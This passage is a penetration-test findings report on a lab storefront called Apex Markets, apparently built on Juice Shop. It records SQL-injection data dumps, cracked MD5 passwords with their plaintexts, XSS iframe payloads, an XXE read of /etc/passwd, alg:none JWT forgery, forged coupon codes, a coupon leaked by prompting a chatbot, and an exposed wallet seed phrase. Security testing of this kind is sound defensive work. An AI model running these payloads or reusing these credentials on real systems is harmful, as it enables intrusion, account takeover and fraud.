**Affected endpoint:** `GET /rest/products/search?q=...`

**Evidence:**

Follow-up Docker-toolbox probes used the already confirmed UNION SQL injection in product search to extract additional tables beyond user credentials:

```text
sqlite-schema_status=200
sqlite-schema_row_count=66
users-selected_status=200
cards-selected_status=200
addresses-selected_status=200
securityanswers-answer_row_count=66
securityquestions_row_count=60
```

Examples from the extracted rows include:

```text
CREATE TABLE `Users` (...)
CREATE TABLE `SecurityAnswers` (... `answer` VARCHAR(255) ...)
cards-selected_sample ... "description":"Bjoern Kimminich","price":4815205605542754 ...
addresses-selected_sample ... "description":"Bjoern Kimminich","price":4917000001,"deluxePrice":"25436","image":"Am Lokalhorst 42"
securityanswers-answer_sample ... "price":"db8b1e81c9a3e9ed03ae162f3197209977bc68c5b095c6ed4d163baa653f48a0"
```

Evidence is saved in:

```text
workspace/scans/docker-apex-sqli-deep-probes.csv
workspace/scans/docker-apex-sqli-deep-summary.txt
workspace/scans/docker-apex-security-answers-probe.csv
workspace/scans/docker-apex-security-answers-summary.txt
```

**Impact:** The product search SQL injection provides broad database read access, including schema, password hashes, account roles, full saved payment card numbers, physical addresses, phone numbers, security questions, and account-recovery answer hashes.

**Severity:** Critical

### F-35: Apex Markets uses weak unsalted MD5 password hashes that crack to valid privileged credentials

**Affected service:** `apex-markets.acme.local`

**Evidence:**

Using the already confirmed product-search SQL injection, a Docker-toolbox probe dumped Apex user password hashes and security-answer hashes, then ran a lab-derived offline dictionary against them. No external wordlists or network sources were used.

```text
candidate_count=1015557
user_hash_count=29
security_answer_hash_count=21
cracked_user_hash_count=6
cracked_security_answer_hash_count=0
cracked_user=admin@apex-markets.example role=admin password=admin123
cracked_user=ethereum@apex-markets.example role=deluxe password=private
cracked_user=testing@apex-markets.example role=admin password=IamUsedForTesting
```

Follow-up live login verification from the Docker toolbox confirmed the cracked seeded credentials are valid:

```text
admin@apex-markets.example_status=200 role=admin user_id=1 bid=1
testing@apex-markets.example_status=200 role=admin user_id=22 bid=14
ethereum@apex-markets.example_status=200 role=deluxe user_id=21 bid=15
```

A later targeted identity pass covered punctuation-heavy seeded passwords that the broad corpus tokenizer did not generate. It matched the SQLi-exfiltrated MD5 hashes locally and then verified live login from the Docker toolbox:

```text
amy@apex-markets.example md5_match=True login_status=200 login_success=True
mc.safesearch@apex-markets.example md5_match=True login_status=200 login_success=True
jim@apex-markets.example md5_match=True login_status=200 login_success=True
```

A later artifact-derived hash-match pass parsed current `workspace/scans`, `workspace/loot`, `workspace/notes`, and `workspace/scripts` text artifacts for password-like strings, compared 114,284 candidate strings to 27 SQLi-exfiltrated Apex MD5 password hashes, and only attempted live logins for exact hash matches. This found and verified Bender's original account password from the exposed tutorial bundle:

```text
target_hashes=27
artifact_candidates=114284
hash_matches=13
new_successful_logins=4
bender@apex-markets.example role=customer login_status=200 success=true previously_known=false password='OhG0dPlease1nsertLiquor!'
```

The other new-success rows in that pass revalidated the already documented Amy, MC SafeSearch, and Jim credentials whose hashes had not been marked as cracked in the earlier broad crack CSV. Some disposable lab accounts matched historic artifact passwords but returned `401` because later reset/mutation probes changed their current passwords.

Evidence is saved in:

```text
workspace/scripts/apex_hash_crack_probe.py
workspace/scans/docker-apex-hash-crack-probes.csv
workspace/scans/docker-apex-hash-crack-summary.txt
workspace/scripts/apex_cracked_login_verify.py
workspace/scans/docker-apex-cracked-login-verify.csv
workspace/scans/docker-apex-cracked-login-verify-summary.txt
workspace/scripts/apex_targeted_identity_login_probe.py
workspace/scans/docker-apex-targeted-identity-login-probes.csv
workspace/scans/docker-apex-targeted-identity-login-summary.txt
workspace/scripts/apex_artifact_password_hash_match_probe.py
workspace/scans/docker-apex-artifact-password-hash-matches.csv
workspace/scans/docker-apex-artifact-password-hash-matches-summary.txt
workspace/scans/docker-lab-derived-candidates.txt
```

**Impact:** Once the database is readable, the password storage format does not provide meaningful resistance. Attackers can recover privileged and seeded-user passwords offline and log in as admin, testing-admin, deluxe, and normal customer accounts without relying on SQLi login bypasses or JWT forgery.

**Severity:** Critical

### F-36: Apex Markets client bundle exposes a valid testing admin password

**Affected service:** `apex-markets.acme.local`

**Evidence:**

The downloaded production JavaScript bundle contains hardcoded testing credentials:

```text
testingUsername="testing@juice-sh.op"
testingPassword="IamUsedForTesting"
```

A Docker-toolbox verification showed the literal upstream-style email is rejected in this lab, but the same hardcoded password works for the lab-domain testing account and returns an admin token:

```text
client_testing_username=testing@juice-sh.op
client_testing_password=IamUsedForTesting
literal-client-credential_status=401
lab-domain-substitution_status=200 token_email=testing@apex-markets.example role=admin user_id=22
```

Evidence is saved in:

```text
workspace/scripts/apex_client_exposed_credentials_probe.py
workspace/scans/docker-apex-client-exposed-credentials-probes.csv
workspace/scans/docker-apex-client-exposed-credentials-summary.txt
```

**Impact:** Anyone who downloads the frontend bundle can recover a valid testing password. In this lab, applying the same password to the lab-domain testing account grants administrator access without needing SQL injection or JWT forgery.

**Severity:** Critical

### F-37: Apex Markets exposes an unreleased hidden language file

**Affected endpoint:** `GET /assets/i18n/tlh_AA.json`

**Evidence:**

A Docker-toolbox static exposure probe found the hidden Klingon language file accessible as a public static asset:

```text
/assets/i18n/tlh_AA.json status=200 len=32139 type=application/json; charset=UTF-8
sample={
  "LANGUAGE": "tlhIngan",
  "NAV_SEARCH": "tu'",
  "SEARCH_PLACEHOLDER": "tu'...",
  ...
}
```

The same probe showed access-log candidate paths such as `/access.log`, `/logs/access.log`, and `/assets/logs/access.log` returned the SPA HTML fallback rather than real log files.

Evidence is saved in:

```text
workspace/scripts/apex_static_exposure_probe.py
workspace/scans/docker-apex-static-exposure-probes.csv
workspace/scans/docker-apex-static-exposure-summary.txt
```

**Impact:** Hidden or unreleased localization assets are publicly enumerable. The direct business impact is low, but it shows static asset publication is broader than the visible UI and can disclose unreleased content.

**Severity:** Low

### F-38: Apex Markets sends password changes through GET query strings

**Affected endpoint:** `GET /rest/user/change-password?current=...&new=...&repeat=...`

**Evidence:**

The frontend bundle calls password change as a GET request with all password values in the URL:

```text
/rest/user/change-password?current=<current>&new=<new>&repeat=<new>
```

A Docker-toolbox probe used a disposable account to verify the request actually changes the password:

```text
registered_email=changepw1781177357@example.com
registered_user_id=32
change_endpoint_method=GET
query_contains_current_password=True
query_contains_new_password=True
change_status=200
old_login_after_change_status=401
new_login_after_change_status=200
```

Evidence is saved in:

```text
workspace/scripts/apex_change_password_get_probe.py
workspace/scans/docker-apex-change-password-get-probes.csv
workspace/scans/docker-apex-change-password-get-summary.txt
```

**Impact:** Current and new passwords can be exposed through URL logs, browser history, proxy logs, referrers, and monitoring systems. The endpoint also uses an unsafe HTTP method for a state-changing account operation.

**Severity:** Medium

### F-39: Apex Markets stores JavaScript iframe payloads in reviews, complaints, and Photo Wall captions

**Affected endpoints:**

- `PUT /rest/products/{id}/reviews`
- `POST /api/Complaints/`
- `POST /rest/memories`
- `GET /rest/products/{id}/reviews`
- `GET /api/Complaints`
- `GET /rest/memories`

**Evidence:**

A Docker-toolbox probe created a disposable Apex account and submitted a unique payload:

```html
<iframe src="javascript:alert(`codex-xss-1781179925`)">
```

The product review API accepted the payload and a follow-up unauthenticated read of `/rest/products/1/reviews` returned it as the stored review `message`.

The complaints API also accepted the same payload. Both the creation response and a low-privilege `GET /api/Complaints` returned the stored `message` containing the iframe JavaScript payload.

The same probe tested `/api/Feedbacks/` with valid CAPTCHA fields. That sink sanitized the submitted HTML to an empty comment, so feedback is not counted as part of this finding.

A follow-up Photo Wall probe submitted the same class of payload as a memory caption with a tiny PNG file. Authenticated `POST /rest/memories` returned success and stored:

```html
<iframe src="javascript:alert(`codex-photo-1781180328`)">
```

Unauthenticated upload was rejected with `401`, and SVG upload was rejected with `Invalid mime type`, but the accepted memory caption came back from public `GET /rest/memories/`.

The same Photo Wall probe also showed that uploaded image files are publicly retrievable under `/assets/public/images/uploads/`. A PNG-magic file uploaded with filename `photo.php` was stored as a `.png` path and served as `image/png`; it was not executed as PHP in the tested path.

Evidence is saved in:

```text
workspace/scripts/apex_xss_sink_probe.py
workspace/scans/docker-apex-xss-sink-probes.csv
workspace/scans/docker-apex-xss-sink-summary.txt
workspace/scripts/apex_photo_wall_probe.py
workspace/scans/docker-apex-photo-wall-probes.csv
workspace/scans/docker-apex-photo-wall-summary.txt
workspace/scans/docker-apex-photo-wall-file-fetch-summary.txt
```

**Impact:** Attackers can persist active HTML/JavaScript payloads in content later consumed by users or administrators. The complaint sink is especially sensitive because complaints are typically reviewed by staff/admin users, making this a stored XSS route into privileged sessions. The Photo Wall sink is public, so any viewer of uploaded memories can be exposed.

**Severity:** High

### F-40: Apex Markets exposes unauthenticated Web3 listener/control endpoints

**Affected endpoints:**

- `GET /rest/web3/nftMintListen`
- `POST /rest/web3/walletExploitAddress`
- `POST /rest/web3/walletNFTVerify`
- `POST /rest/web3/submitKey`

**Evidence:**

Static review of the Apex frontend Web3 service found these lab-side endpoints:

```text
/rest/web3/nftUnlocked
/rest/web3/nftMintListen
/rest/web3/submitKey
/rest/web3/walletNFTVerify
/rest/web3/walletExploitAddress
```

A Docker-toolbox endpoint matrix showed unauthenticated `GET /rest/web3/nftMintListen` returns:

```json
{"success":true,"message":"Event Listener Created"}
```

An isolated Docker follow-up, run without first calling `nftMintListen`, showed unauthenticated `POST /rest/web3/walletExploitAddress` with an empty JSON body also returns:

```json
{"success":true,"message":"Event Listener Created"}
```

Subsequent malformed or dummy Web3 POST bodies to `walletExploitAddress`, `walletNFTVerify`, and `submitKey` returned `502 Bad Gateway` from the proxy instead of clean input validation errors. Known non-Web3 Apex routes still responded normally afterward, so the evidence supports fragile/externalized Web3 endpoint handling rather than a persistent full-app outage.

Evidence is saved in:

```text
workspace/scripts/apex_web3_endpoint_matrix_probe.py
workspace/scans/docker-apex-web3-endpoint-matrix-probes.csv
workspace/scans/docker-apex-web3-endpoint-matrix-summary.txt
workspace/scans/docker-apex-web3-post-followup.txt
```

**Impact:** Unauthenticated callers can trigger server-side Web3 listener setup and malformed Web3 control requests are not handled safely. This creates an availability and resource-consumption risk on a public application endpoint. No wallet takeover, private-key recovery, or on-chain state change was proven from these requests.

**Severity:** Low

### F-41: Portal login page discloses internal resources and ops identity

**Affected endpoint:** `GET /portal/auth`

**Evidence:**

A Docker-toolbox static follow-up fetched the Portal login page and its referenced assets. The unauthenticated HTML includes:

```text
platform-ops@acme.internal
http://wiki.acme.internal/
file://fileserver.acme.internal/corporate
Build 2.4.1 / v2.4.1
```

Evidence is saved in:

```text
workspace/scripts/portal_static_followup.py
workspace/scans/docker-portal-static-followup-summary.txt
workspace/scans/portal-static-followup/auth.html
workspace/scans/portal-static-followup/auth.headers
workspace/scans/portal-static-followup/static__css__style.css
```

**Impact:** The public login page exposes internal hostnames, a corporate file-share path, an internal wiki URL, a likely support/ops account identity, and precise build/version metadata. This helps targeted credential guessing, phishing, internal-route discovery, and follow-on exploitation if an SSRF, file-fetch, or authenticated foothold is later found.

**Severity:** Low

### F-42: Apex Markets allows wildcard CORS on sensitive public APIs

**Affected endpoints:**

- `GET /rest/admin/application-configuration`
- `GET /rest/memories`
- `GET /rest/captcha`
- `OPTIONS /rest/admin/application-configuration`
- `OPTIONS /rest/memories`
- `OPTIONS /rest/captcha`
- `OPTIONS /api/Users`

**Evidence:**

A Docker-toolbox CORS matrix sent `Origin: https://attacker.example` to sensitive lab endpoints. Apex returned wildcard CORS on already-sensitive public APIs:

```text
GET /rest/admin/application-configuration -> Access-Control-Allow-Origin: *
GET /rest/memories -> Access-Control-Allow-Origin: *
GET /rest/captcha -> Access-Control-Allow-Origin: *
```

Preflight requests also returned `Access-Control-Allow-Origin: *` with broad methods and request headers:

```text
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: authorization,content-type
```

The same matrix did not observe comparable CORS exposure on Portal, Customer API, or Gitea endpoints tested.

Evidence is saved in:

```text
workspace/scripts/cors_matrix_probe.py
workspace/scans/docker-cors-matrix.csv
workspace/scans/docker-cors-matrix-summary.txt
```

**Impact:** Any arbitrary website can make a browser read Apex's exposed admin configuration, CAPTCHA answers, and public memory records including nested user metadata/password hashes already documented in F-16, F-20, and F-23. The broad preflight policy also increases the blast radius of future or token-bearing browser integrations by allowing many methods and the `authorization` header cross-origin.

**Severity:** Medium

### F-43: Apex Markets stores attacker-controlled True-Client-IP as lastLoginIp

**Affected endpoint:** `GET /rest/saveLoginIp`

**Evidence:**

A Docker-toolbox probe registered and logged in as a disposable Apex customer, then called `/rest/saveLoginIp` with unique iframe JavaScript payloads in common client-IP headers. The application ignored payloads in `X-Forwarded-For`, `X-Real-IP`, `Forwarded`, and `User-Agent`, but accepted the `True-Client-IP` value and stored it verbatim as the user's `lastLoginIp`:

```text
True-Client-IP: <iframe src="javascript:alert(`codex-header-xss-1781181714`)">
```

The immediate `/rest/saveLoginIp` response returned the payload in the user object, including the account's password hash. Follow-up reads from authenticated user-list APIs also contained the same marker/payload:

```text
saveLoginIp-true-client-ip -> contains_marker=True contains_payload=True
auth-details-after-true-client-ip -> contains_marker=True contains_payload=True
api-users-after-true-client-ip -> contains_marker=True contains_payload=True
```

Evidence is saved in:

```text
workspace/scripts/apex_header_xss_probe.py
workspace/scans/docker-apex-header-xss-probes.csv
workspace/scans/docker-apex-header-xss-summary.txt
```

**Impact:** A low-privilege authenticated user can inject attacker-controlled HTML/JavaScript into the account telemetry field used for last-login IP tracking. The payload is persisted and exposed to authenticated user-list views/APIs. Browser execution was not directly proven in this probe because the evidence path is API-based, but any administrative or account view that renders `lastLoginIp` without HTML escaping would execute attacker-supplied script. This also strengthens F-21 because the same endpoint still returns the caller's password hash in the response.

**Severity:** Medium

### F-44: Apex Markets file upload parser allows unauthenticated XXE local file disclosure

**Affected endpoint:** `POST /file-upload`

**Evidence:**

A Docker-toolbox file-handling probe uploaded XML to the deprecated B2B file-upload endpoint. Even though the endpoint returns `410 Gone`, the server parses the XML first and reflects the parsed document inside the error page. An unauthenticated upload containing an external entity for `file:///etc/passwd` returned local account data in the HTML `<title>`:

```text
unauth-xxe-passwd status=410 passwd=True
root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
```

The same probe confirmed authenticated XXE behavior and read `file:///etc/hostname`, which returned the container hostname-like value `56a70305a402`.

Evidence is saved in:

```text
workspace/scripts/apex_file_handling_probe.py
workspace/scans/docker-apex-file-handling-probes.csv
workspace/scans/docker-apex-file-handling-summary.txt
workspace/scripts/apex_xxe_path_probe.py
workspace/scans/docker-apex-xxe-path-probes.csv
workspace/scans/docker-apex-xxe-path-summary.txt
```

**Impact:** Any unauthenticated caller can make the Apex server read local files that the application process can access and reflect the result in the response. This can disclose filesystem layout, runtime identities, environment-adjacent files, secrets, and other local application data. The vulnerable behavior is especially significant because the endpoint looks deprecated but still processes attacker-supplied XML.

**Severity:** High

### F-45: Apex Markets file upload accepts double-extension and oversize PDF uploads

**Affected endpoint:** `POST /file-upload`

**Evidence:**

The same Docker-toolbox file-handling matrix sent uploads that should be rejected by type and size controls:

```text
auth-upload-type-bypass-php status=204 filename=invoice.pdf.php content_type=application/pdf
auth-upload-oversize status=204 filename=large.pdf size=110000+ bytes
```

The endpoint returned `204 No Content` for both the double-extension PDF/PHP filename and a PDF body larger than 100 KB. XML and YAML uploads, by contrast, returned deprecated-interface `410` error pages after parsing.

Evidence is saved in:

```text
workspace/scripts/apex_file_handling_probe.py
workspace/scans/docker-apex-file-handling-probes.csv
workspace/scans/docker-apex-file-handling-summary.txt
```

**Impact:** Apex accepts uploads that violate expected extension and size restrictions. No public retrieval path, server-side execution, or overwrite behavior was proven for these accepted files in this probe, so the confirmed impact is validation bypass and potential storage/processing risk rather than remote code execution.

**Severity:** Low

### F-46: Apex Markets trusts client-supplied couponData during checkout

**Affected endpoint:** `POST /rest/basket/:id/checkout`

**Evidence:**

Frontend review showed the payment flow stores coupon metadata in browser session storage and sends it during checkout as:

```text
couponData = btoa(sessionStorage.getItem("couponDetails"))
couponDetails = <couponCode>-<clientDate>
```

A Docker-toolbox checkout matrix first confirmed direct checkout accepts base64 coupon metadata for the hard-coded campaign coupons without requiring a successful `PUT /rest/basket/:id/coupon/:code` redemption. A second verifier used normal positive baskets, newly created address records, and newly created card records so the result did not rely on the negative-quantity basket chain.

For a normal two-item Apple Juice order:

```text
empty couponData -> promotionalAmount "0", totalPrice 4.97
base64("ORANGE2023-1683154800000") -> promotionalAmount "1.59", totalPrice 3.38
base64("ORANGE2020-1588546800000") -> promotionalAmount "1.99", totalPrice 2.98
base64("NOTREAL-1683154800000") -> promotionalAmount "0", totalPrice 4.97
```

The older `ORANGE2020` through `ORANGE2023` values are hard-coded client campaigns with historical `validOn` timestamps. Direct checkout redeemed them in 2026 when supplied as base64 `couponData`, even though earlier direct `/coupon/` endpoint testing rejected the decoded 2013 backup coupons and obvious variants.

Evidence is saved in:

```text
workspace/scripts/apex_checkout_coupondata_probe.py
workspace/scans/docker-apex-checkout-coupondata-probes.csv
workspace/scans/docker-apex-checkout-coupondata-summary.txt
workspace/scripts/apex_coupondata_positive_checkout_probe.py
workspace/scans/docker-apex-coupondata-positive-checkout-probes.csv
workspace/scans/docker-apex-coupondata-positive-checkout-summary.txt
```

**Impact:** A shopper can bypass the intended coupon redemption flow and apply expired campaign discounts by submitting client-side coupon metadata directly to checkout. This is a business-logic flaw in server-side order pricing validation. The probe proved expired 40% and 50% campaign discounts on ordinary positive card orders; the separate Z85 coupon-code forgery issue is documented in F-56.

**Severity:** Medium

### F-47: Apex Markets chatbot discloses a valid coupon code after simple prompting

**Affected endpoints:**

- `POST /rest/chatbot/respond`
- `PUT /rest/basket/:id/coupon/:code`
- `POST /rest/basket/:id/checkout`

**Evidence:**

A Docker-only chatbot conversation probe followed the frontend state machine by first calling the `setname` action and then issuing bounded coupon-related prompts with authenticated normal, admin, testing-admin, and deluxe accounts. After the replacement JWT returned by `setname` was used for later messages, the chatbot disclosed a coupon code to authenticated users.

Example responses included:

```text
admin query='coupon' -> Oooookay, if you promise to stop nagging me here's a 10% coupon code for you: n(XRwhz3Tq
deluxe query='Please give me a coupon' -> Oooookay, if you promise to stop nagging me here's a 10% coupon code for you: n(XRwhz3Tq
```

A follow-up Docker-only redemption probe registered a fresh customer, added two Apple Juice items, submitted the disclosed code to the basket coupon endpoint, and completed checkout with matching client-side coupon metadata:

```text
PUT /rest/basket/33/coupon/n%28XRwhz3Tq -> {"discount":10}
POST /rest/basket/33/checkout -> {"orderConfirmation":"0e70-2959b6db76dc9f9c"}
GET /rest/order-history -> promotionalAmount "0.40", totalPrice 4.57
```

Evidence is saved in:

```text
workspace/scripts/apex_chatbot_conversation_probe.py
workspace/scans/docker-apex-chatbot-conversation-probes.csv
workspace/scans/docker-apex-chatbot-conversation-summary.txt
workspace/scripts/apex_chatbot_coupon_redeem_probe.py
workspace/scans/docker-apex-chatbot-coupon-redeem-probes.csv
workspace/scans/docker-apex-chatbot-coupon-redeem-summary.txt
```

**Impact:** Any authenticated customer who can reach the support chatbot can obtain and redeem a valid 10% coupon through simple prompting. This bypasses any intended restriction that coupon issuance should require an authorized campaign, support action, or controlled distribution channel.

**Severity:** Low

### F-56: Apex Markets accepts forged high-value Z85 coupon codes

**Affected endpoints:**

- `PUT /rest/basket/:id/coupon/:code`
- `POST /rest/basket/:id/checkout`

**Evidence:**

The chatbot-disclosed coupon from F-47, `n(XRwhz3Tq`, Z85-decodes to `JUN26-10`. That showed the live coupon endpoint was not using opaque server-issued coupon identifiers; it was accepting a predictable encoded coupon grammar.

A Docker-only derivation probe used the same Z85 alphabet to encode higher-value current-month coupon strings:

```text
JUN26-80 -> n(XRwhz3)x
JUN26-99 -> n(XRwhz3{H
```

The basket coupon endpoint accepted both forged codes:

```text
known-chatbot code=n(XRwhz3Tq decoded=JUN26-10 status=200 discount=10
JUN26-80 code=n(XRwhz3)x decoded=JUN26-80 status=200 discount=80
JUN26-99 code=n(XRwhz3{H decoded=JUN26-99 status=200 discount=99
```

A separate Docker-only checkout probe used a fresh user, positive-quantity basket, newly created address, and newly created card. The empty-coupon baseline produced `promotionalAmount:"0"` and `totalPrice":4.97`. The forged 99% coupon, sent as `couponData=btoa("n(XRwhz3{H-1781136000000")`, completed checkout and produced `promotionalAmount":"3.94"` with final `totalPrice":1.03`.

Negative controls for mismatched months/years such as `JAN26-80`, `DEC26-80`, `JAN13-80`, and `DEC13-80` were rejected with `404 Invalid coupon.`, narrowing the finding to predictable valid-period coupon derivation rather than every arbitrary coupon string.

Evidence is saved in:

```text
workspace/scripts/apex_forged_coupon_probe.py
workspace/scans/docker-apex-forged-coupon-probes.csv
workspace/scans/docker-apex-forged-coupon-summary.txt
workspace/scripts/apex_forged_coupon_checkout_probe.py
workspace/scans/docker-apex-forged-coupon-checkout-probes.csv
workspace/scans/docker-apex-forged-coupon-checkout-summary.txt
```

**Impact:** A normal authenticated shopper can derive and redeem current-period discounts up to at least 99%, bypassing controlled coupon issuance and server-side pricing intent. This turns the chatbot's 10% disclosure into a reusable coupon-forgery oracle once the encoding scheme is recognized.

**Severity:** High

### F-48: Apex Markets public feedback exposes a Web3 wallet seed phrase

**Affected endpoint:** `GET /api/Feedbacks`

**Evidence:**

A Docker-only probe fetched the public feedback API without authentication and found a seeded feedback comment containing a 12-word wallet phrase and an explicit `/juicy-nft` reference:

```text
GET /api/Feedbacks -> 200
feedback_id=4 user_id=21 rating=1 word_count=12
phrase=purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
comment=Please send me the juicy chatbot NFT in my wallet at /juicy-nft : "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch" (***ereum@apex-markets.example)
```

The same probe confirmed the related Web3/NFT challenge metadata is live in the lab:

```text
GET /api/Challenges/?key=nftMintChallenge -> 200
name="Mint the Honey Pot"
tags="Web3,Internet Traffic"
description="Mint the Honey Pot NFT by gathering BEEs from the bee haven."
```

Evidence is saved in:

```text
workspace/scripts/apex_public_wallet_seed_probe.py
workspace/scans/docker-apex-public-wallet-seed-probes.csv
workspace/scans/docker-apex-public-wallet-seed-summary.txt
```

**Impact:** Anyone who can reach the public feedback API can read a wallet recovery phrase associated with a Web3/NFT flow. If the phrase is active, it can allow full recovery and control of the corresponding wallet. This was not escalated into external on-chain activity because that would require leaving the lab Web3 boundary.

**Severity:** Medium

### F-49: Apex Markets allows unauthenticated product catalog tampering

**Affected endpoint:** `PUT /api/Products/:id`

**Evidence:**

A Docker-only mutation probe snapshotted product `1`, sent a unique marker through unauthenticated `PUT /api/Products/1`, and then fetched the same product again without authentication. The marker persisted in the product description:

```text
baseline GET /api/Products/1 -> description "The all-time classic."
unauthenticated PUT /api/Products/1 -> 200, description "The all-time classic. codex-prodqty-1781184195398"
unauthenticated GET /api/Products/1 -> 200, marker still present
```

The same request also succeeded with a normal customer token and an admin token. `PATCH /api/Products/1` routed to an Angular error path, but `PUT` performed the update. The probe restored the original product description afterward and confirmed the marker was gone:

```text
admin restore PUT /api/Products/1 -> 200, description "The all-time classic."
final GET /api/Products/1 -> 200, marker false
```

Quantity item mutation was also checked in the same run; `PUT`, `PATCH`, and `GET` against `/api/Quantitys/1` returned `403 {"error":"Malicious activity detected"}` for unauthenticated, customer, and admin contexts, so no quantity tampering was claimed from that path.

Evidence is saved in:

```text
workspace/scripts/apex_product_quantity_mutation_probe.py
workspace/scans/docker-apex-product-quantity-mutation-probes.csv
workspace/scans/docker-apex-product-quantity-mutation-summary.txt
```

**Impact:** An unauthenticated attacker can alter product catalog fields such as descriptions. Depending on displayed fields, this can mislead shoppers, deface the storefront, or serve as a stepping stone to stored content injection if frontend rendering changes or additional product fields are abused.

**Severity:** Medium

### F-50: Apex Markets exposes order tracking details without authentication or ownership checks

**Affected endpoint:** `GET /rest/track-order/:orderId`

**Evidence:**

A Docker-only probe created two fresh customer accounts and completed one normal checkout for each account. It then queried both generated order IDs through the tracking endpoint without credentials and with the first customer's token.

The endpoint returned full tracking data for the first user's order without authentication:

```text
created order A: 6704-ddfb6f9067e88b37
GET /rest/track-order/6704-ddfb6f9067e88b37 without Authorization -> 200
response fields included orderId, masked email, paymentId, addressId, totalPrice, products, deliveryPrice, eta, and internal _id
```

A follow-up run explicitly queried the second user's order ID without authentication and with the first user's token:

```text
created order A: 6704-ddfb6f9067e88b37
created order B: 5667-b3549ccc14094f92
GET /rest/track-order/5667-b3549ccc14094f92 without Authorization -> 200
GET /rest/track-order/5667-b3549ccc14094f92 with user A token -> 200
```

Both responses for order B included the second user's masked email, payment/address IDs, product name, quantity, total price, delivery price, ETA, and internal order document ID.

The same script also tested bounded NoSQL/operator-style payloads, including encoded JSON objects with `$ne`, `$gt`, `$regex`, `$where`, nested `orderId` operators, bracket-style parameters, query-string operator shapes, and POST JSON bodies. These payloads were reflected as literal `orderId` values or produced `500` responses; they did not return multiple orders or another user's order data. That negative result is recorded as coverage rather than as a separate injection finding.

Evidence is saved in:

```text
workspace/scripts/apex_track_order_nosql_probe.py
workspace/scans/docker-apex-track-order-nosql-probes.csv
workspace/scans/docker-apex-track-order-nosql-summary.txt
```

**Impact:** Anyone who obtains or guesses a valid order ID can retrieve order tracking details without logging in. Authenticated users can also retrieve other users' order tracking details by ID. The exposed data includes purchase contents, pricing, delivery metadata, masked email, payment/address record IDs, and internal document IDs.

**Severity:** Medium

### F-51: Apex Markets exposes and accepts challenge continue-code without authentication

**Affected endpoints:**

- `GET /rest/continue-code`
- `PUT /rest/continue-code/apply/:code`

**Evidence:**

A Docker-only probe used the frontend's exact route shape for continue-code restoration. The code endpoint returned a valid continue-code without authentication:

```text
GET /rest/continue-code -> 200
{"continueCode":"REw3bOxm9248vVA65TYf4S1nul6hDOtnJfXrSBBuM6coQ0jWKnoaJqPpLyrk"}
```

The same code was accepted by the apply endpoint without authentication, with a normal customer token, and with an admin token:

```text
PUT /rest/continue-code/apply/REw3bOxm9248vVA65TYf4S1nul6hDOtnJfXrSBBuM6coQ0jWKnoaJqPpLyrk -> 200
{"data":"11 solved challenges have been restored."}
```

Invalid, prefix-only, and URL-like codes returned `404 Invalid continue code.` A read-only follow-up against `/api/Challenges` showed 11 challenges marked solved after the unauthenticated restore, including `loginAdminChallenge`, `weakPasswordChallenge`, `negativeOrderChallenge`, `uploadSizeChallenge`, `uploadTypeChallenge`, `xxeFileDisclosureChallenge`, `bullyChatbotChallenge`, and `exposedCredentialsChallenge`.

The related `/rest/continue-code-findIt` and `/rest/continue-code-fixIt` endpoints returned no code in this lab state. Their empty-code apply routes produced existing-style verbose `500` Angular route stack traces, not successful progress restoration.

Evidence is saved in:

```text
workspace/scripts/apex_continue_code_apply_probe.py
workspace/scans/docker-apex-continue-code-apply-probes.csv
workspace/scans/docker-apex-continue-code-apply-summary.txt
```

**Impact:** Any unauthenticated user can retrieve the current lab continue-code and apply it to restore solved challenge progress. In a scoring/training environment this compromises score integrity and lets users mark a set of challenges solved without performing the corresponding actions. It also exposes additional state about which challenges were restored.

**Severity:** Low

### F-52: Apex Markets 2FA verification accepts unsigned forged temporary JWTs

**Affected endpoint:** `POST /rest/2fa/verify`

**Evidence:**

A Docker-only probe registered a disposable user, fetched `/rest/2fa/status`, computed the current TOTP locally from the returned enrollment secret, and enabled 2FA for that account. A normal login then returned the expected `totp_token_required` response with a signed temporary token:

```text
login_after_2fa_status=401 tmp_token_present=True
tmp_token_payload={"iat": 1781185633, "type": "password_valid_needs_second_factor_token", "userId": 65}
```

The endpoint correctly rejected missing, empty, random, and setup-token-as-temp-token values. It also rejected unsigned JWTs with the wrong payload shape. However, an unsigned `alg:none` JWT containing the expected `userId` and `type` was accepted and returned a full authenticated session token:

```text
verify_unsigned-none-password-valid-type=200 token_present=True
```

The same run showed the legitimate signed temp token is reusable after successful verification:

```text
verify_valid-tmp-current-totp=200 token_present=True
verify_replay-valid-tmp-current-totp=200 token_present=True
```

Evidence is saved in:

```text
workspace/scripts/apex_2fa_verify_probe.py
workspace/scans/docker-apex-2fa-verify-probes.csv
workspace/scans/docker-apex-2fa-verify-summary.txt
```

**Impact:** The 2FA verify flow does not require the temporary token to be a server-signed result of a successful password check. If an attacker obtains a user's TOTP secret and user ID, they can mint their own temporary token and receive a full Apex session without knowing the password. This compounds F-28's unsigned JWT acceptance and F-33's client-exposed 2FA secret handling. Reusable legitimate temp tokens also increase replay risk if one is captured during the 2FA flow.

**Severity:** Medium

### F-53: Apex Markets has client-side DOM/reflected XSS in search and track-result routes

**Affected frontend routes:**

- `#/search`
- `#/track-result/new?id=...`

**Evidence:**

Local review of the Apex frontend tutorial chunk found two client-side XSS flows that were not separately counted in the earlier API-backed stored-XSS finding.

For the search route, the bundled "DOM XSS" tutorial waits for the search-result element's `innerHTML` to contain attacker-controlled markup:

```text
#searchValue -> <h1>owasp</h1>
#searchValue -> <iframe src="javascript:alert(`xss`)"></iframe>
```

The tutorial text explicitly describes this as a DOM XSS issue handled by frontend code without sending the payload to the server.

For the track-result route, the bundled "Reflected XSS" tutorial instructs using the URL hash parameter:

```text
#/track-result/new?id=<iframe src="javascript:alert(`xss`)">
```

It waits for the hash to match that payload and says pressing Enter may show an alert.

Evidence is saved in:

```text
workspace/scans/apex-js-chunks/tutorial.js
workspace/scans/apex-client-xss-static-summary.txt
```

**Impact:** Attackers can craft URLs or UI-driven payloads that execute JavaScript in a victim's Apex Markets browser session. This is distinct from the stored XSS sinks in F-39 because the payload is handled entirely in the client-side route/rendering layer.

**Severity:** Medium

### F-54: Apex Markets registration ignores password confirmation and accepts weak passwords

**Affected endpoint:** `POST /api/Users/`

**Evidence:**

A Docker-only probe created disposable Apex accounts with malformed registration fields and then attempted login with the submitted passwords.

